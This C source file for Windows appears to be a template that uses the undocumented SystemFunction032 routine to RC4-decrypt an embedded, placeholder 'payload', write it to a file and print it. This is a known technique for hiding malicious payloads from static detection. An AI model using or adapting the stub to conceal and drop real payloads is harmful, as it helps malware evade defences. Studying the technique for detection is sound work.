#include <Windows.h>
#include <stdio.h>

// [[CIPERTEXT]]

// [[KEY]]

// [[FILENAME]]

typedef struct
{
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} USTRING;

typedef NTSTATUS(NTAPI* fnSystemFunction032)(
    struct USTRING* Data,
    struct USTRING* Key
    );

BOOL SysFunc032(IN PBYTE pKey, IN PBYTE pPayload, IN DWORD dwKeySize, IN DWORD sPayloadSize) {

    NTSTATUS STATUS = NULL;

    USTRING Data = {
        .Length = sPayloadSize,
        .MaximumLength = sPayloadSize,
        .Buffer = pPayload
    };

    USTRING Key = {
        .Length = dwKeySize,
        .MaximumLength = dwKeySize,
        .Buffer = pKey
    };

    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

    if ((STATUS = SystemFunction032(&Data, &Key)) != 0x0) {
        printf("[!] SystemFunction032 FAILED With Error: 0x%0.8X \n", STATUS);
        return FALSE;
    }

    return TRUE;
}

DWORD WritePayload(LPWSTR filename) {
	HANDLE hFile = CreateFile(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE) {
		return -1;
	}

	DWORD bytesWritten;
	if (!WriteFile(hFile, cipertext, sizeof(cipertext), &bytesWritten, NULL)) {
		CloseHandle(hFile);
		return -1;
	}
	CloseHandle(hFile);
	return 0;
}

DWORD PrintPayload() {
	printf("payload : \"%s\" \n", cipertext);
}

int main() {
	if (!SysFunc032(key, cipertext, sizeof(key), sizeof(cipertext))) {
		return -1;
	}

	WritePayload(filename);
	PrintPayload();
}